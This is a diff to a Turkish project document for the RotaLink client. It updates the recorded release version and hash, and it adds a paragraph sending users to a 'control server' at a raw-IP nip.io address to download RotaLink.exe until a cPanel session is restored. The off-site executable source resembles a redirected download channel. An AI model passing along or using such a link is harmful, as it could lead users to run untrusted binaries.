@@ -15,8 +15,13 @@ Canlı WordPress temasındaki indirme düğmesi `website/rotaniz-download-button
 
 Son doğrulanan yayın:
 
-- Sürüm: `0.9.1`
-- Dosya boyutu: `118.272` bayt
-- SHA-256: `4541e996351079fb4d587902e2d2001c92f7653f9fc631c2ec9a6612e4d251ba`
+- rotaniz.com sürümü: `1.1.0-alpha.2`
+- Dosya boyutu: `132.096` bayt
+- SHA-256: `08ce7a64b57e7cbebb645e45b38142da6ddf1a01bb7c56a0ed128f57a6bcc583`
+
+Yetkili input düzeltmesini içeren `1.1.0-alpha.3`, cPanel oturumu yenilenene kadar
+kontrol sunucusundaki `https://45.87.173.201.nip.io/downloads/RotaLink.exe`
+adresinden yayınlanır. Bu dosyanın boyutu `132.608` bayt, SHA-256 özeti
+`863b7dd913445d382c90d1a585f888aec5c6d14289d3d588d7d53934f82aa271` değeridir.
 
 İstemci bağlantı tanılama günlüğünü `%LocalAppData%\RotaLink\rotalink.log` dosyasına yazar.
